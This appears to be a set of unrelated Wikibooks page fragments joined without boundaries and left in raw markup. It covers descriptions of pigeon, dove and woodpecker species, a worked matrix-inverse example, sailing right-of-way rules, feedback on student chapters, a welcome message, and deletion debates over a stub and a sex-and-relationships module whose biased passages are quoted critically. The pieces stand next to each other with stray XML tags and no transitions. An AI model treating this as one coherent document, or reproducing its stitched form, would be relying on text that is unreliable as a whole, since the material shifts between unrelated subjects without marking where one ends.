I am currently a trainee Physics teacher, so I may well have a go at sprucing up the A-level Physics textbook (which already looks to have had a good start made on it).</text>

| description = The '''Rock Pigeon''' (''Columba livia''), is a member of the bird family Columbidae, doves and pigeons. The bird is also known by the names of '''feral pigeon''' or '''domestic pigeon'''.  In common usage, this bird is often simply referred to as the &quot;pigeon&quot;.  The species was commonly known as '''Rock Dove''' until the British Ornithologists' Union and the American Ornithologists' Union changed the official English name of the bird in their regions to Rock Pigeon.

The Rock Pigeon has a restricted natural resident range in western and southern Europe, North Africa, and into South Asia. Its habitat is natural cliffs, usually on coasts. Its domesticated form, the feral pigeon, has been widely introduced elsewhere, and is common, especially in cities, over much of the world. In Britain, Ireland, and much of its former range, the Rock Pigeon probably only occurs pure in the most remote areas. A Rock Pigeon's life span is anywhere from 3-5 years in the wild to 15 years in captivity, though longer-lived specimens have been reported.

The Rock Pigeon is 30-35 cm long with a 62-68 cm wingspan. The white lower back of the pure Rock Pigeon is its best identification character, but the two black bars on its pale grey wings are also distinctive. The tail is margined with white. It is strong and quick on the wing, dashing out from sea caves, flying low over the water, its white rump showing well from above.

The head and neck of the mature bird are a darker blue-grey than the back and wings; the lower back is white. The green and lilac or purple patch on the side of the neck is larger than that of the Stock Dove, and the tail is more distinctly banded. Young birds show little luster and are duller.  Eye color of the pigeon is generally orange but a few pigeons may have white-grey eyes. The eyelids are orange and are encapsulated in a grey-white eye ring. Feet are red to pink.

When circling overhead, the white under wing of the bird becomes conspicuous. In its flight, behavior, and voice, which is more of a dovecot ''coo'' than the phrase of the Wood Pigeon, it is a typical pigeon.  Although it is a relatively strong flier, it also glides frequently, holding its wings in a very pronounced V shape as it does.  Though fields are visited for grain and green food, it is nowhere so plentiful as to be a pest. 

The nest is usually on a ledge in a cave; it is a slight structure of grass, heather, or seaweed. Like most pigeons it lays two white eggs. The eggs are incubated by both parents for about 18 days.

The nestling has pale yellow down and a flesh-coloured bill with a dark band. It is tended and fed on &quot;crop milk&quot; like other doves. The fledging period is 30 days.

      <text xml:space="preserve">The inverse of a matrix may be found using several different methods.  The method that is guaranteed to work is by augmenting a nxn matrix with &lt;math&gt;I_{n}&lt;/math&gt;, and solving to the RREF.

==An example==

&lt;math&gt;\begin{bmatrix} 1 &amp; 3 \\ 2 &amp; 2 \end{bmatrix} \Bigg| \begin{bmatrix} 1 &amp; 0 \\ 0 &amp; 1 \end{bmatrix}&lt;/math&gt;

&lt;math&gt;...&lt;/math&gt;

&lt;math&gt;\begin{bmatrix} 1 &amp; 0 \\ 0 &amp; 1 \end{bmatrix} \Bigg| \begin{bmatrix} -\cfrac{1}{2} &amp; \cfrac{3}{4} \\ \cfrac{1}{2} &amp; -\cfrac{1}{4} \end{bmatrix}&lt;/math&gt;

The inverse of the matrix is the second augmented matrix.  In this case,

&lt;math&gt;\begin{bmatrix} -\cfrac{1}{2} &amp; \cfrac{3}{4} \\ \cfrac{1}{2} &amp; -\cfrac{1}{4} \end{bmatrix}&lt;/math&gt;

| image_1 = Streptopelia turtur01.JPG
| caption_1 = Turtle Dove
| description = The '''Turtle Dove''' (''Streptopelia turtur'') is a member of the bird family Columbidae, which includes the doves and pigeons.

It is a migratory species with a western [[w:Palearctic|Palearctic]] range, including Turkey and north Africa, though it is rare in northern Scandinavia and Russia; it winters in southern Africa. 

In the British Isles, France, and elsewhere in northwestern Europe it is in severe population decline. This is partly because changed farming practices mean that the weed seeds and shoots on which it feeds, are scarcer, and partly due to shooting of birds on migration in Mediterranean countries.

Smaller and slighter in build than other doves, the Turtle Dove may be recognized by its browner color, and the black and white striped patch on the side of its neck, but it is its tail that catches the eye when it flies from the observer; it is wedge shaped, with a dark center and white borders and tips. When viewed from below this pattern, owing to the white under tail coverts obscuring the dark bases, is a blackish chevron on a white ground. This is noticeable when the bird stoops to drink, raising its spread tail. 

The mature bird has the head, neck, flanks, and rump blue grey, and the wings cinnamon, mottled with black. The abdomen and under tail coverts are white. The bill is black, the legs and eyerims are red. The black and white patch on the side of the neck is absent in the browner and duller juvenile bird, which also has the legs brown.

The Turtle Dove, one of the latest migrants, rarely appears in Northern Europe before the end of April, returning south again in September.

It is a bird of open rather than dense woodlands, and frequently feeds on the ground. It will occasionally nest in large gardens, but is usually extremely timid, probably due to the heavy hunting pressure it faces on migration. The flight is often described as arrowy, but is not remarkably swift.

| description = The '''Wood Pigeon''' (''Columba palumbus'') is a member of the family Columbidae, doves and pigeons.

In the colder northern and eastern parts of its European and western Asiatic range the Wood Pigeon is a migrant, but in southern and western Europe it is a well distributed and often abundant resident.

The three Western European ''Columba'' pigeons, Wood Pigeon, Stock Pigeon, and Rock Pigeon, though superficially alike, have very distinctive characteristics; the Wood Pigeon may be identified at once by its larger size at 38-43 cm, and the white on its neck and wing. It is otherwise a basically grey bird, with a pinkish breast.  

Juvenile birds do not have the white patches on either side of the neck.  When they are about 6 months old (about 3 months out of the nest) they gain a small white patch on both sides of the neck, which gradually enlarge until they are fully formed when the bird is about 6-8 months old (approx. ages only).  Juvenile birds also have a greyer beak and an overall lighter grey appearance than adult birds.

It breeds in trees in woods, parks and gardens, laying two white eggs in a simple stick nest which hatch after 17 to 19 days.  Wood pigeons seem to have a preference for trees near roadways and rivers.  The nests are vulnerable to attack, particularly by crows, the more so early in the year when the leaf cover is not fully formed.  The young usually fly at 33 to 34 days; however if the nest is disturbed some young may be able to survive having left the nest as early as 20 days from hatching.

Its flight is quick, performed by regular beats, with an occasional sharp flick of the wings, characteristic of pigeons in general. It takes off with a loud clattering.  It perches well, and in its nuptial display walks along a horizontal branch with swelled neck, lowered wings, and fanned tail.  During the display flight the bird climbs, the wings are smartly cracked like a whiplash, and the bird glides down on stiff wings.  The noise in climbing flight is caused by the whipcracks on the downstroke rather than the wings striking together.

The Wood Pigeon is gregarious, often forming very large flocks outside the breeding season. Most of its food is vegetable, taken from open fields or gardens and lawns; young shoots and seedlings are favored, and it will take grain. 

The call is a characteristic cooing (''coo-coo-coo-cu-cu''). This species can be an agricultural pest, and it is often shot, being a legal quarry species in most European countries. It is wary in rural areas, but often quite tame where it is not persecuted.

| description = The '''Red-bellied Woodpecker''', ''Melanerpes carolinus'', is a medium-sized woodpecker.

Adults are mainly light grey on the face and underparts; they have black and white barred patterns on their back, wings and tail. Adult males have a red cap going from the bill to the nape; females have a red patch on the nape and another above the bill. The reddish tinge on the belly that gives the bird its name is difficult to see in field identification. They are 9 to 10.5 inches long, and have a wingspan of 15 to 18 inches. 

Their breeding habitat is usually deciduous forests in southern Canada and the northeastern United States, however they may range as far south as Florida and as far west as Texas. They nest in the decayed cavities of dead trees, old stumps, or in live trees that have softer wood such as elms, maples, or willows; both sexes assist in digging nesting cavities.

These birds search out insects on tree trunks. They may also catch insects in flight. They are omnivores, eating insects, fruits, nuts and seeds.

Red-bellied woodpeckers are noisy birds, and have many varies calls. Calls have been described as sounding like ''&quot;churr-churr-churr&quot;'' or ''&quot;chuf-chuf-chuf&quot;'' with an alternating ''&quot;br-r-r-r-t&quot;'' sound. Males tend to call and drum more frequently than females, but both sexes call.

Red-bellied woodpeckers are attracted to noises that resonate. They tap noisily on aluminum roofs, metal guttering and even on cars to attract mates. Their annoying sound can cause dismay to a person who wishes to sleep peacefully at night.

| caption_1 = Stock Pigeon
| description = The '''Stock Pigeon''' (''Columba oenas'') (formerly Stock Dove) is a member of the family Columbidae, doves and pigeons.

In the northern part of its European and western Asiatic range the Stock Pigeon is a migrant, elsewhere it is a well distributed and often plentiful resident.

The three western European ''Columba'' pigeons, though superficially alike, have very distinctive characters; the Wood Pigeon may at once be told by the white on its neck and wing, but the Rock Pigeon and Stock Pigeons are more alike in size and plumage. 

The former, however, has a white rump, and two well-marked black bars on the wing, but the rump of the Stock is grey, and the bars are incomplete. 

The haunts of the Stock Pigeon are in more or less open country, for though it often nests in trees it prefers parklands to thick woods. It is common on coasts where the cliffs provide holes.  Its flight is quick, performed by regular beats, with an occasional sharp flick of the wings, characteristic of pigeons in general. 

It perches well, and in nuptial display walks along a horizontal branch with swelled neck, lowered wings, and fanned tail. During the circling spring flight the wings are smartly cracked like a whiplash.

The Stock Pigeon is sociable as well as gregarious, often consorting with Wood Pigeons, though doubtless it is the presence of food which brings them together. 

Most of its food is vegetable; young shoots and seedlings are favoured, and it will take grain. 

The short, deep, &quot;grunting&quot; ''Ooo-uu-ooh'' call is quite distinct from the modulated cooing notes of the Wood Pigeon; it is loud enough to be described, somewhat fancifully, as &quot;roaring&quot;.

The nest, though it is seldom that any nest material is used, is usually in a hole in a tree, a crack in a rock face, or in a rabbit burrow, but the bird also nests in ivy, or in the thick growth round the boles of linden trees.

| caption_1 = White-tipped Dove
| description = The '''White-tipped Dove''' (''Leptotila verreauxi'') is a large New World tropical dove. It is a resident breeder from the southernmost Texas in the USA through Mexico and Central America south to western Peru and central Argentina. It also breeds on the offshore islands of northern South America, including Trinidad and Tobago. 

The White-tipped Dove inhabits scrub, woodland and forest. It builds a large stick nest in a tree and lays two white eggs. Incubation is about 14 days, and fledging another 15. 

The White-tipped Dove has an approx. length of 28 cm (11 in) and a weight of 155 g (5½ oz). Adult birds of most races have a grey tinge from the crown to the nape, a pale grey or whitish forehead and a whitish throat. The eye-ring is typically red in most of its range, but blue in most of the Amazon and northern South America. The upperparts and wings are grey-brown, and the underparts are whitish shading to pinkish, dull grey or buff on the chest. The underwing coverts are rufous. The tail is broadly tipped with white, but this is best visible from below or in flight. The bill is black, the legs are red and the iris is yellow.

The White-tipped Dove resembles the closely related Grey-fronted Dove, ''Leptotila rufaxilla'', which prefers humid forest habitats. The best distinctions are the greyer forehead and crown, which contrast less with the hindcrown than in the Grey-fronted Dove. In the area of overlap, the White-tipped Dove usually has a blue (not red) eye-ring, but this is not reliable in some parts of Brazil, Argentina, Bolivia, Paraguay and Uruguay, where it typically is red in both species.
 
The White-tipped Dove is usually seen singly or in pairs, and is rather wary. Its flight is fast and direct, with the regular beats and clattering of the wings which are characteristic of pigeons in general.

The food of this species is mainly seeds obtained by foraging on the ground, but it will also take insects, including butterflies and moths. The call is a deep hollow ''ooo-wooooo''.

| caption_1 = Band-tailed Pigeon
| description = The '''Band-tailed Pigeon''', ''Patagioenas fasciata'', is a medium-sized bird of the Americas.

It ranges from British Columbia, Utah, and Colorado south in higher elevations through Mexico and Central America to northern Argentina. In autumn it migrates out of the part of its range north of California, New Mexico, and west Texas. Populations from Costa Rica south are sometimes considered a separate species, the White-naped Pigeon, ''C. albilinea''. It is found at altitudes from 900 m to 3600 m, generally in oak, pine-oak, and coniferous forests. It feeds on seeds, notably acorns.

It is the biggest pigeon in North America, averaging {{units|34 to 36 cm|14-15 inches}} long and weighing {{units|250-450 grams|0.55-1 lbs}}. The plumage is gray, somewhat darker above. The head and underparts have a faint pink cast, especially in the adult male; the belly is nearly white. The distal half of the tail is also pale (except in the subspecies of Baja California), whence the English name. The bill and feet are yellow, good identification marks at sufficiently close range. Adults have green iridescence on the back of the neck, adjacent to a thin white collar on the nape. Juvenile birds have white feather edges above, giving a scaly appearance.

This species is relatively quiet for a pigeon.  Its voice is low-pitched and owl-like, often in two-syllable calls that rise and than fall (''huu-ooh'') with even spacing between calls.

It builds a rudimentary platform nest out of twigs, in which it lays one or two eggs.  Outside the breeding season it forms flocks, sometimes over 50 birds, and often becomes nomadic, following the acorn crop or moving to lower altitudes or other areas outside its breeding range.  It often visits bird feeders.

You guys really seem to be on track.  Just make sure you focus on writing for a person that does not know anything on the subject.  This will help you organize your thoughts.  Make sure to put extra emphasis on topics which act as the foundation of your general topic.  This is important because your chapter is the first of many we are working on.

I really like the fact that you are using the new subjet matter we are working with in our texts for your chapter.  This chapter was the first thing I thought of while reading chapter 7, and I wanted to make sure you used it.  It is a very simple idea, but make sure you keep things organized.  The hardest thing to do when it comes to writing a chapter like this is to organize it so a normal reader can comprehend everything and really learn the structure that brings all of our ideas together.  Keep that in mind while writing.

      <text xml:space="preserve">For the purposes of the sailing honor we will focus in the rules of the road that apply to small sailing boats.

It is important to note here that you are responsible for learning the rules and regulations that apply to whichever boat you are operating in the country and state or province where you are operating the boat. 

There are '''five''' basic rules of the road for small sailing boats to decide who has the &quot;Right-of-Way&quot; so that each boat's skipper (driver) will know what to do to avoid a collision.

When sailing the words &quot;left&quot; and &quot;right&quot; in reference are replaced with &quot;port&quot; and &quot;starboard&quot;. It is important to remember which is which since the rules of the road for sailing rely on using these words to assign right-of-way.


[[Image:Sail-Port-Starboard.jpg]]

You might be able to remember this by noticing that the letter &quot;R&quot; appears twice in the word &quot;starboard&quot;, and only once in &quot;port&quot;. Then since &quot;right&quot; begins with &quot;R&quot;, you will know that the right hand side of the boat when facing forward is the starboard side.

The next item to remember is the word &quot;tack&quot; and how it is used to describe which side of the boat the wind is blowing from. As seen in the illustration below, if the wind is coming from the right hand side of the boat, and the sail is on the left side, the boat is on a starboard tack. When the wind and sail are reveresed, the boat is on a port tack.


[[image:Sail-Tacks.jpg]]

=== Rule Number 1: ===

When two sailboats are approaching each other and are on different tacks, the boat on the starboard tack has the right-of-way over the boat which is in the port tack. An easy way to remember this is to think about power boat lights. At the front the boat has red on the port (left side) and green to the starboard (right). If you are approaching a boat and can &quot;see&quot; the red light, then the other boat has the right of way. (small sail boats rarely have the actual lights, but you can imagine them)

In the illustration below, boat &quot;A&quot; on the port tack, must turn to avoid boat &quot;B&quot; on the starboard tack.

[[Image:Sail-Different-Tack.jpg]]

=== Rule Number 2: ===

When two sailboats are approaching each other and are on the same tack, the leeward boat has the right-of-way over the windward boat. Another way to say this is to say that the boat closer to the wind source must keep clear. The boat further from the wind source has the right-of-way.

In the illustration below, boat &quot;B&quot; is the windward boat and must turn to avoid boat &quot;A&quot; which is leeward.

[[Image:Sail-Same-Tack.jpg]]

=== Rule Number 3 ===

A sailboat that is staying on a tack has the right-of-way over a sailboat that is tacking or gybing. A simpler way to say this is to say &quot;make sure you have room to complete a tack or a gybe without interfering with any other boats before doing so&quot;. Make sure that you can see clearly in all directions to ensure you have room.

In the illustration below, boat &quot;A&quot; must ensure that it leaves plenty of room to avoid boat &quot;B&quot;, who has the right-of-way, since boat &quot;B&quot; is continuing on its tack. However, in the event that boat &quot;A&quot; was unable to tack due to the proximity of &quot;B&quot;, remember that &quot;A&quot; is the leeward boat so therefore could tell boat &quot;B&quot; to give room to tack, but would lose this right of way as soon as they actually began to tack.

[[Image:Sail-Tack-Jibe.jpg]]

=== Rule Number 4 ===

Any sailboat that is overtaking a slower boat from behind must steer clear of the slower boat and give right-of-way. The slower boat should hold its course and allow the faster boat to pass.

In the illustration below, boat &quot;A&quot; is a faster boat, and must steer around the slower boat &quot;B&quot;, who should remain on the same course.


[[Image:Sail-Overtake.jpg]]


=== Rule Number 5 ===

Most of the time sailboats have the right-of-way over power boats. Since most powerboats are more easily maneuverable than sailboats, they must steer clear. This is not always the case however. Larger power boats are sometimes steering in the deep channel of the area, and cannot leave the channel. In this case the sailboat does not have right-of-way, and must avoid impeding the progress of the larger vessel. Many larger power boats cannot simply stop quickly or easily turn to avoid a small sailboat, so it is in the sailor's best interest to steer well clear of these larger boats.

In the illustration below, the powerboat &quot;A&quot; must turn to avoid the sailboat &quot;B&quot;, who has the right-of-way.

I really like your organization.  Keep that up, and constantly be looking for new mediums.  Make sure you link all of the ideas you are focusing on together within each section.  Organization is huge when it comes to helping outsiders understand what we are doing.

== your chapter talks abous some of the topics discussed in other chapters ==

Sean and Lee Ann:

your chapter discusses at least 2 topics that are covered in other chapters of this book: film and academe. How can we resolve this so that there is no duplication of the discussion in the book? I can. for instance, see the merger between sections of your chapter and the chapter on visual rhetoric in the academic world. What do you think?</text>

      <text xml:space="preserve">Hello and '''[[Wikibooks:Welcome, newcomers|welcome]]''' to [[Wikibooks]]!

Here are some tips to help you get started:
* You should sign your name on Talk and vote pages using four tildes, like this: &amp;#126;&amp;#126;&amp;#126;&amp;#126;.
* Remember to conduct any editing experiments in the [[Wikibooks:Sandbox|sandbox]].
* If you're a '''Wikipedian''', see [[Wikibooks:Wikibooks for Wikipedians]] for a primer on how things work here (it's a little different).
** If you want to base your work here on materials from Wikipedia, please use [[WB:RFI]] to bring the material over in compliance with the GFDL.
* If you're an '''instructor''' and plan on using wikibooks for a class project, see [[Wikibooks:Guidelines for class projects]]
* Please say hello at the [[WB:SL|Staff Lounge]] with any questions or ideas.
* Eventually, you might want to read the [[Wikibooks:Manual of Style|Manual of Style]] and [[Wikibooks:Policies and guidelines|Policies and Guidelines]].
** Please take a look at [[Wikibooks:Naming policy]] before starting a new book.
* Remember to maintain a [[Wikibooks:Neutral point of view|Neutral point of view]].

Hi Spoon,
How are you? I noticed you made an edit at Java Programming book. Welcome. Feel free to help us make this book better.

You typed the text &quot;&lt;? super ClassName&gt;&quot;. The word 'super' here is not valid. You may want to correct it. Thanks. [[User:Ervinn|Ervinn]] ([[User talk:Ervinn|talk]]) 14:24, 10 December 2007 (UTC)
: Yes it is. --[[User:Spoon!|Spoon!]] ([[User talk:Spoon!|talk]]) 11:03, 17 December 2007 (UTC)</text>

      <text xml:space="preserve">== Variations ==

I'm not too sure what the etiquette is here, but concerning this recipe I have a comment/variation that I'd like to have considered.

Marinating the oysters should be marked as optional, as I've never come across this in any other recipe I've seen, and the dish remains what it is without that stage. A fairly common option is to include either a sage or a basil leaf with each oyster.

I guess I'm going to have to find some sort of policy stuff on what goes on here: should the recipes here be absolutely minimalist, or should every individual variation be included?

* '''Keep as Stub''' - This is a book stub with a general outline.  A study guide/textbook certainly is legitimate in this situation, and the section headers are basically straight off this professional license exam.  There really isn't anything else like this on Wikibooks, and this is something that IMHO should eventually be developed here in terms of having a book that would help with the preparation for this exam.  This is not intended to be the exam itself, but a study guide for the exam, such as a college entrance exam like the SAT or ACT exams given in the USA where similar study guides have been written.  Or think of a similar kind of study guide for those taking a Bar Exam.  --[[User:Robert Horning|Rob Horning]] 22:52, 27 February 2007 (UTC)
* '''Delete''' - accepting the &quot;maybe a stub might bring someone&quot; there really is nothing worthwhile here and it has not been actively edited for a year (barely then).  Anyone wanting to write this will almost certainly start again --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 10:28, 3 March 2007 (UTC)
:*'''Weak delete''' - I have nothing wrong with study guides, and I have no problem with someone outlining a subject. But this has been up for a rather long time. When there is clearly no one working on a textbook stub, whether we keep it or not depends on whether it has content. Should we keep something on the basis that it has material that will help future editors provide content? Perhaps, but this is an outline. Outlines can be useful for a new editor, other times, it can just be a needless restriction. For the reader browsing wikibooks, an outline really provides nothing at all. I'm reluctant to say delete, because the outline seems well-designed, but with no direction, no content, and ambiguous usefulness, this book doesn't seem like it needs to stay. --[[User:Monk|&lt;font color=&quot;green&quot;&gt;Monk&lt;/font&gt;]]&lt;sub&gt;[[User talk:Monk|talk]]&lt;/sub&gt; 18:59, 4 March 2007 (UTC)
*'''Keep''' - it's a stub and so could be expanded.  Being a stub is not grounds for deletion in my opinion. [[User:Xania|Xania]] [[Image:Flag_of_Poland_2.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 19:30, 11 March 2007 (UTC)
* '''Delete''' If its not being worked on, &amp; is of little use to future contributors, kill it.--[[User:Archolman|Dick]] 23:12, 17 March 2007 (UTC)
* '''delete'''. Being a stub alone is not reason for a page to be deleted, this is true. However, being an abandoned stub with no active author, nothing for future editors to build upon, and little hope of ever becoming &quot;not a stub&quot; are good reasons all in favor of deletion. This book has not been edited in over a year, the author who started it has been absent for nearly that time as well. I find it highly unlikely also that anything here is worth salvaging for a future effort on this same subject. Having a stub like this around discourages new authors from starting their own books (they feel trapped into the currently existing book, if they can even find it) and discourages people from deviating from the outline already posted. Worse then being a stub, it's likely counter-productive to future book writing efforts. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 19:13, 22 March 2007 (UTC)

{{Closed|1=&lt;span style=&quot;background:red; color:white&quot;&gt;closed&lt;/span&gt; as '''Keep''' but '''improvement is imperative'''. All opinions seem to be on the table, a few gracious Wikibookians are trying to work on it, and if it needs to be discussed again, we can do so later. --[[User:SBJohnny|&lt;font color=&quot;green&quot;&gt;'''SB_Johnny'''&lt;/font&gt;]] {{!}} &lt;sup&gt;[[User talk:SBJohnny|&lt;font color=&quot;green&quot;&gt;talk&lt;/font&gt;]]&lt;/sup&gt; 19:26, 19 March 2007 (UTC)}}

I'm nominating this page as it's been listed as [[NPOV]] for some time and it's shockingly biased and in many parts lacking sources.  It reads like a pamphlet produced by the United States Republican party or some kind of right-wing Christian group.  The 'advice' about not dating drug users is without any suitable sources and this book seems to be encouraging abstinence which, again, seems to be US policy in recent years and completely based on religious belief.  It might also be racist as it seems to employ that black people are more likely to carry STDs.  In short, this module is terrible.  This nomination should also be considered to be my '''supporting''' vote. [[User:Xania|Xania]] [[Image:Flag_of_Poland_2.svg|15px]][[User talk:Xania|&lt;sup&gt;talk&lt;/sup&gt;]] 22:05, 13 March 2007 (UTC)

*'''Keep''', even though I agree with Xania for the most part.  Yes, there is a POV bias and some lacking in references.  So what?  What actual Wikibooks policy is being violated here?  When put into the greater context of the [[Relationships]] Wikibook, it seems to be a much more realistic topic that should go with that book.  And Wikibooks is not censored for minors.  If you disagree with the POV, fix it.  There are other modules in this Wikibook which are of nearly the same quality and would also justify a POV dispute.  There is no need to single this particular module out of the whole book, nor a reason to delete it when you can simply edit out the content you find objectionable (but assuming good faith on the part of the original contributor).  This is clearly something in book form and can be used (in theory) as a textbook for a legitimate university-level course. --[[User:Robert Horning|Rob Horning]] 23:11, 13 March 2007 (UTC)
*'''Delete''' - If you need a policy reference to delete, [[WB:WIW#Wikibooks_is_not_a_soapbox]] is one. This reads like someone's personal essay on sex and by looking at the history I can see that one user formed almost all of its content. There's a big difference between a page with some POV to be fixed and tweaked later and an advocacy essay. If I had more time I would inspect the rest of the book to see if it is as similarly biased and we may want to expand this VfD to the whole book if the rest of it is this bad. If the rest of the book is so similarly written as Rob suggests, then I would say that [[WB:WIW#Wikibooks_is_not_a_place_to_publish_original_works]] might also be violated since [[User:Tdkehoe]] really wrote this entire book and we shouldn't host his/her original research and stance on relationships, one that is extremely biased by the looks of this one page. I realize that there are numerous citations throughout the pages, but a biased article can be created easily when all the sources you select agree with you, something that can be found without much difficulty using modern research tools. This page would need to be emptied to get the POV out of it and also reminds me of a pamphlet a religious group would give out. This page has gone way too far and can be re-created properly after deletion should we choose not to delete the entire book. Furthermore, I would lose a great deal of respect for a university that chose to use this text. I don't think you can say this essay is very academic even with its references. Politics uses this writing style, not the field of psychology. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 12:39, 14 March 2007 (UTC)
*:As far as being used in a university setting, I've actually had textbooks on human relationships and sexuality with a much stronger POV bias than this one both in my high school and at a university.  I understand your concern about the NPOV here, but does it rise to a level of deleting an entire Wikibook, when the NPOV bias was the only justification for its removal?  I do think this VfD ought to be about the whole book and not just this module if that is the case.  Typically NPOV bias is not used as rationale for simply deleting content but as a motivation for editing.  And I do think this book is something that could be written in an NPOV fashion.
*:I guess this also seems to suggest to me a sort of attitude of &quot;I don't like the POV of this Wikibooks contributor, and therefore we need to kick him off this project&quot;.  --[[User:Robert Horning|Rob Horning]] 15:25, 14 March 2007 (UTC)
*::We can extend this VfD to the entire book then. Adding POV that is as extreme as this cripples a book. Correction requires removal of content almost entirely and takes significantly more effort than just creating the book properly from the beginning again. We can go in and rip out all the POV but that's essentially deleting the pages and takes more time. You assume bad faith when you suggest such things to yourself as well since I could care less about the main editor's personal POV. What I do care about is that user writing a book here comprised solely of his/her POV and not a collective stance, something explicitly forbidden here. This user can come in and work on the new book as long as he/she works on it with an NPOV stance. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 21:49, 14 March 2007 (UTC)
*:::I think the assumption of bad faith here is on the part of the person who actually wrote this stuff in the first place.  By focusing on out right dismissal of the content of this page as a violation of NPOV principles, and not attempting to educate the contributors on what NPOV standards actually mean but instead simply taking the easy road and just deleting the content, we have taken a legitimate attempt at writing a book and telling this person to go away, we don't need him here on Wikibooks.  This is not assuming good faith at all.  And yes, by you saying that this needs to be deleted is indeed saying that you have a strong objection to his POV.  I think you care about this particular editor's POV because you wouldn't be willing to take such drastic action if you didn't.  By deleting this whole Wikibook (and the same arguments can be applied to all of the rest of the modules in this book), you are saying that nearly all of the contributions of this user are meaningless and without any value at all.  --[[User:Robert Horning|Rob Horning]] 15:52, 15 March 2007 (UTC)
*::::You've extremely overreacted to what I said and made it some huge issue. Calm down please. No one is telling this person to go away and that user has edited several other books without issue. Let's not generalize this user's entire world of Wikibooks to a single VFD discussion because he/she has worked on many other projects. Deleting a page or book will say the same thing as ripping 99% of it out and re-writing it. I'm not labeling your solution with such ridiculous terms, so don't label mine. Once again, '''you''' have '''no''' concept of my personal opinions on this user's POV. Deleting a socialist or liberal POV work is the same as deleting whatever we want to label this more conservative work as. We've deleted other radically biased works here before. Again, this user worked on other projects here and has plenty of other pages to work on. You've turned this thread of discussion into discussing me and not the work anymore, so like several other times in the past I will no longer be responding to your incorrect assumptions. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 17:44, 15 March 2007 (UTC)
*'''Delete'''. This page was previously [[Wikibooks:Requests for deletion/Relationships/Sex|nominated for deletion]], a motion that failed to acheive concensus. I was in favor of deletion then, and I am in favor of deletion still. The section about AIDS is particularly appalling. There are almost no mentions of using birth control or condoms, except stating statistics where these methods fail as a demonstration of the relative success of abstinence methods. No serious book on sexual practices, unless it is motivated by particular bias, is going to ignore contraception and prophylactics. By comparison, the [[Sexual Health]] goes into detailed instructions about how to properly use birth control and condoms, and explains that proper use of these methods can help to prevent STDs or unwanted pregnancies. [[Sexual Health]] also has a long, respectful page about abstinence as well, so I dont want to hear people say that it is similarly but oppositely biased from the [[Relationships]] book on the subject. Here are some quotes that I found to be particularly disturbing: &quot;Stereotypically, a woman wants to find her knight in shining armor who'll make her life perfect in every way&quot; (implying that women are subservient, or are dependant on men for happiness), &quot;There are a number of mechanical devices that increase sexual arousal in women. Among these is the Mercedes-Benz 500SL&quot; (implying that women are attracted to wealth), &quot;the BDSM lifestyle ... encourages some dysfunctional behaviors&quot; (implying that BDSM partners are dysfunctional), &quot;If you have unprotected sex once with an HIV+ partner, you have about a one in 500 chance of infection&quot; (implying that contracting AIDS is based on luck, or chance), &quot;women are seen as victims and men are seen as offenders when unwanted intimacy occurs. Although the following paragraphs maintain this gender bias...&quot; (further propagating this myth), and there are a million more. To fix all the NPOV violations in this page would require the current text to be almost removed entirely. --[[User:Whiteknight|Whiteknight]] &lt;small&gt;([[User talk:Whiteknight|talk]]) ([[User:Whiteknight/Proposed Books|projects]])&lt;/small&gt; 18:13, 14 March 2007 (UTC)
*'''Keep''' with extensive rewrite. A book on relationships would be remiss without a chapter on sex. The NPOV problems, although numerous, can be fixed. All the arguments for deletion are over content, not whether or not Wikibooks should have a chapter on sex in the Relationships book. Therefore, it should be labelled with an &quot;NPOV&quot; or &quot;neutrality disputed&quot; tag, not deleted. [[User:PurplePieman|PurplePieman]] 00:05, 15 March 2007 (UTC)
*'''Keep''' There is useful and sourced material included. POV can be edited. We have decided to keep books that exhibit strong and debatable POV with far less substantiation than this in the past. -- [[User:Xixtas|&lt;span style=&quot;color:turquoise&quot;&gt;xixtas&lt;/span&gt;]] &lt;sup&gt;[[User_Talk:Xixtas|&lt;span style=&quot;color:magenta&quot;&gt;talk&lt;/span&gt;]]&lt;/sup&gt; 04:15, 15 March 2007 (UTC)
*'''Keep''' yup problems on the POV and lacking references but has good content.  --[[User:Panic2k4|Panic]] 17:56, 15 March 2007 (UTC)

*'''Comment''' I refuse to close this as keep (although this may well be the consensus) given the really very poor POV as Xania's original comments.  Equally the keep votes (virtually) depend on it being rewritten &amp; from past experience here that is quite unlikely to happen before some of us have shuffled off this world! If nothing else happens (a rewrite, another person closing it?) I think I will close as delete given the fact that it is very unlikely to be rewritten --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 13:23, 17 March 2007 (UTC)
*:As I tried to say above, I think any such decision to keep or delete this module should also apply to this whole Wikibook.  Nearly every module in this book has similar POV problems, and I think it is misguided to delete just this one module on these arguments alone, if the rest of the book is going to come back here to this VfD page again.  --[[User:Robert Horning|Rob Horning]] 15:21, 17 March 2007 (UTC)

* '''Delete''' Textbook? No. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 16:54, 17 March 2007 (UTC)
* '''Delete''' unless some poor sod wants to do a rewrite--[[User:Archolman|Dick]] 23:38, 17 March 2007 (UTC)

